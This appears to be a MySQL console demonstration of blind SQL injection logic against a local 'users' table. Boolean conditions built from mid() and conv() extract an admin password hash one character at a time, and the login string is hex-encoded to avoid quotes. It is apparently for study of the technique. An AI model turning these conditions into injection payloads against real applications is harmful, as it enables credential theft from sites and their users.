mysql> select login,pass from users;
+-------+----------------------------------+
| login | pass                             |
+-------+----------------------------------+
| admin | fcea920f7412b5da7be0cf42b8c93759 |
+-------+----------------------------------+
1 row in set (0.00 sec)

mysql> select mid((select pass from users where login='admin'),1,1);
+-------------------------------------------------------+
| mid((select pass from users where login='admin'),1,1) |
+-------------------------------------------------------+
| f                                                     |
+-------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select conv(mid((select pass from users where login='admin'),1,1),16,10);
+-------------------------------------------------------------------+
| conv(mid((select pass from users where login='admin'),1,1),16,10) |
+-------------------------------------------------------------------+
| 15                                                                |
+-------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1 and 15 =  conv(mid((select pass from users where login='admin'),1,1),16,10);
+-------------------------------------------------------------------------------+
| 1 and 15 =  conv(mid((select pass from users where login='admin'),1,1),16,10) |
+-------------------------------------------------------------------------------+
|                                                                             1 |
+-------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1 and 14 =  conv(mid((select pass from users where login='admin'),1,1),16,10);
+-------------------------------------------------------------------------------+
| 1 and 14 =  conv(mid((select pass from users where login='admin'),1,1),16,10) |
+-------------------------------------------------------------------------------+
|                                                                             0 |
+-------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1 and 'f' = mid((select pass from users where login='admin'),1,1);
+-------------------------------------------------------------------+
| 1 and 'f' = mid((select pass from users where login='admin'),1,1) |
+-------------------------------------------------------------------+
|                                                                 1 |
+-------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1 and 'b' = mid((select pass from users where login='admin'),1,1);
+-------------------------------------------------------------------+
| 1 and 'b' = mid((select pass from users where login='admin'),1,1) |
+-------------------------------------------------------------------+
|                                                                 0 |
+-------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1 and 15 = conv(mid((select pass from users where login=0x61646d696e),1,1),16,10);
+-----------------------------------------------------------------------------------+
| 1 and 15 = conv(mid((select pass from users where login=0x61646d696e),1,1),16,10) |
+-----------------------------------------------------------------------------------+
|                                                                                 1 |
+-----------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql> select 1 and 14 = conv(mid((select pass from users where login=0x61646d696e),1,1),16,10);
+-----------------------------------------------------------------------------------+
| 1 and 14 = conv(mid((select pass from users where login=0x61646d696e),1,1),16,10) |
+-----------------------------------------------------------------------------------+
|                                                                                 0 |
+-----------------------------------------------------------------------------------+
1 row in set (0.00 sec)


